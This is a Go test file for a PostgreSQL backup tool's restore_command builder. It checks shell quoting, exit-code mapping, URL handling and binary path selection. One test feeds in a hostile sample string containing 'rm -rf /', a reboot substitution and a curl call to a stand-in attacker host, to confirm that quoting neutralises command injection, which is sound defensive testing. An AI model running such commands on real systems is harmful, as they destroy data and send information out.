package walfetchcmd

import (
	"strings"
	"testing"
)

// TestShellQuote_LeavesPlainStringsLiteral pins the no-special-chars
// shape: a path becomes itself wrapped in single quotes.
func TestShellQuote_LeavesPlainStringsLiteral(t *testing.T) {
	if got := ShellQuote("/usr/bin/pg_hardstorage"); got != `'/usr/bin/pg_hardstorage'` {
		t.Errorf("ShellQuote = %q", got)
	}
}

// TestShellQuote_NeutralisesShellMetacharacters: any shell-metachar
// payload survives verbatim inside the single quotes.
func TestShellQuote_NeutralisesShellMetacharacters(t *testing.T) {
	hostile := "x; rm -rf / | $(reboot) && echo `whoami` > /tmp/p && curl http://attacker.example/?$IFS"
	got := ShellQuote(hostile)
	if !strings.HasPrefix(got, "'") || !strings.HasSuffix(got, "'") {
		t.Errorf("ShellQuote should bracket with single quotes: %q", got)
	}
	if body := got[1 : len(got)-1]; body != hostile {
		t.Errorf("hostile body should be preserved verbatim:\n  got:  %q\n  want: %q",
			body, hostile)
	}
}

// TestShellQuote_EscapesEmbeddedSingleQuotes: the close-escape-reopen
// idiom is the only way to embed a single quote inside a single-
// quoted shell string.
func TestShellQuote_EscapesEmbeddedSingleQuotes(t *testing.T) {
	if got := ShellQuote("acme's-prod"); got != `'acme'\''s-prod'` {
		t.Errorf("ShellQuote = %q", got)
	}
}

func TestShellQuote_HandlesEmpty(t *testing.T) {
	if got := ShellQuote(""); got != `''` {
		t.Errorf("ShellQuote('') = %q", got)
	}
}

// TestBuild_ContainsExitCodeMapping asserts the exit-6 → exit-1
// translation that fixes the restore sandbox recovery loop is
// actually emitted in the produced restore_command.  A future
// edit that rebuilds the command without the mapping should fail
// here loudly rather than silently regress recovery.
func TestBuild_ContainsExitCodeMapping(t *testing.T) {
	got := Build("/p/bin/pg_hardstorage", "db1", "file:///srv/repo")
	if !strings.Contains(got, "ec=$?") || !strings.Contains(got, "[ $ec = 6 ] && exit 1") {
		t.Errorf("Build output should include the exit-6 → exit-1 mapping:\n%s", got)
	}
}

// TestBuild_PreservesPGPlaceholders: PG substitutes %f / %p before
// invoking system(), so they must reach the shell as literals.
func TestBuild_PreservesPGPlaceholders(t *testing.T) {
	got := Build("/p/bin/pg_hardstorage", "db1", "file:///srv/repo")
	if !strings.Contains(got, " %f %p ") {
		t.Errorf("Build output should pass %%f %%p through to PG:\n%s", got)
	}
}

// TestBuild_RepoURLWithMetacharsIsLiteral: a repo URL with `&` and
// `?` (S3 query-string) is single-quoted so the shell receives it
// as one token rather than splitting on `&` as a background-process
// operator (the original restore sandbox repro).
func TestBuild_RepoURLWithMetacharsIsLiteral(t *testing.T) {
	repoURL := "s3://bucket?endpoint=http://h:9000&path_style=true&region=us-east-1"
	got := Build("/p/bin/pg_hardstorage", "db1", repoURL)
	wantSubstr := "'" + repoURL + "'"
	if !strings.Contains(got, wantSubstr) {
		t.Errorf("Build output should single-quote repoURL verbatim, got:\n%s\nwant substring:\n%s",
			got, wantSubstr)
	}
}

// TestBuild_NoNestedShellWrapper: the historical attempt wrapped
// the script in `sh -c "..."`.  That broke `&` in URLs because the
// outer shell stripped the inner quotes — see Build's docstring.
// Pin the absence here so a regression doesn't silently restore the
// loop-forever recovery behaviour.
func TestBuild_NoNestedShellWrapper(t *testing.T) {
	got := Build("/p/bin/pg_hardstorage", "db1", "file:///srv/repo")
	if strings.HasPrefix(got, "sh -c") {
		t.Errorf("Build should NOT wrap in `sh -c`; PG's system() already provides one shell:\n%s", got)
	}
}

// TestBuild_RewritesSimpleCompanionBinary is the issue-#105 regression: a
// restore driven from pg_hardstorage_simple must NOT bake the simple
// binary's own path into restore_command — that companion has no `wal fetch`
// subcommand, so PG's recovery fails with `unknown argument "wal"` and the
// cluster waits forever for WAL. The agent path must be rewritten to the
// full pg_hardstorage that sits beside it.
func TestBuild_RewritesSimpleCompanionBinary(t *testing.T) {
	got := Build("/home/elvi/pg_hardstorage/bin/pg_hardstorage_simple", "noplay", "file:///home/elvi/repo/")
	if strings.Contains(got, "pg_hardstorage_simple") {
		t.Errorf("restore_command must not reference the simple companion:\n%s", got)
	}
	if !strings.Contains(got, "'/home/elvi/pg_hardstorage/bin/pg_hardstorage' wal fetch") {
		t.Errorf("restore_command should invoke the sibling full agent:\n%s", got)
	}
}

// TestBuild_LeavesAgentAndCustomBinariesUnchanged: the full agent path and
// any unrecognised name (custom installs, test binaries) pass through as-is.
func TestBuild_LeavesAgentAndCustomBinariesUnchanged(t *testing.T) {
	for _, bin := range []string{
		"/usr/local/bin/pg_hardstorage",
		"pg_hardstorage",
		"/opt/custom/my-agent-build",
	} {
		got := Build(bin, "db1", "file:///srv/repo")
		if !strings.Contains(got, "'"+bin+"' wal fetch") {
			t.Errorf("Build should pass %q through unchanged:\n%s", bin, got)
		}
	}
}

// TestNormalizeAgentBin_BareName: a bare companion name (no directory)
// resolves to the bare agent name for PATH lookup at recovery time.
func TestNormalizeAgentBin_BareName(t *testing.T) {
	if got := normalizeAgentBin("pg_hardstorage_simple"); got != "pg_hardstorage" {
		t.Errorf("normalizeAgentBin(bare simple) = %q, want pg_hardstorage", got)
	}
}

// TestBuild_RestoreBinEnvOverride is the issue-#107 regression: when the
// recovery environment differs from the restore host, the operator points
// RestoreBinEnv at the binary's path there, and the generated
// restore_command embeds THAT, not the restore host's os.Executable() path.
func TestBuild_RestoreBinEnvOverride(t *testing.T) {
	t.Setenv(RestoreBinEnv, "/opt/pg/bin/pg_hardstorage")
	got := Build("/usr/bin/pg_hardstorage", "demo", "s3://b/?endpoint=http://minio:9000&region=us-east-1")
	if !strings.Contains(got, "'/opt/pg/bin/pg_hardstorage' wal fetch") {
		t.Errorf("override should be embedded as the restore_command binary:\n%s", got)
	}
	if strings.Contains(got, "/usr/bin/pg_hardstorage") {
		t.Errorf("restore-host path must NOT leak when override is set:\n%s", got)
	}
}

// TestBuild_RestoreBinEnvOverrideBareName: a bare name resolves via PATH in
// the recovery environment (e.g. the pg_hardstorage image), which is exactly
// what an operator wants when they can't predict the install path.
func TestBuild_RestoreBinEnvOverrideBareName(t *testing.T) {
	t.Setenv(RestoreBinEnv, "pg_hardstorage")
	got := Build("/usr/bin/pg_hardstorage", "demo", "file:///srv/repo")
	if !strings.Contains(got, "'pg_hardstorage' wal fetch") {
		t.Errorf("bare-name override should be embedded for PATH resolution:\n%s", got)
	}
}

// TestBuild_RestoreBinEnvWinsOverCompanionNormalize: the override is
// authoritative — it bypasses companion-binary normalisation entirely.
func TestBuild_RestoreBinEnvWinsOverCompanionNormalize(t *testing.T) {
	t.Setenv(RestoreBinEnv, "/recovery/env/pg_hardstorage")
	got := Build("/install/bin/pg_hardstorage_simple", "db1", "file:///srv/repo")
	if !strings.Contains(got, "'/recovery/env/pg_hardstorage' wal fetch") {
		t.Errorf("override should win over companion normalisation:\n%s", got)
	}
}

// TestBuild_UnsetRestoreBinEnvFallsBack: with the override empty/unset, Build
// falls back to the companion-normalised agent path (unchanged behaviour).
func TestBuild_UnsetRestoreBinEnvFallsBack(t *testing.T) {
	t.Setenv(RestoreBinEnv, "")
	got := Build("/usr/bin/pg_hardstorage", "db1", "file:///srv/repo")
	if !strings.Contains(got, "'/usr/bin/pg_hardstorage' wal fetch") {
		t.Errorf("empty override should fall back to agentBin:\n%s", got)
	}
}
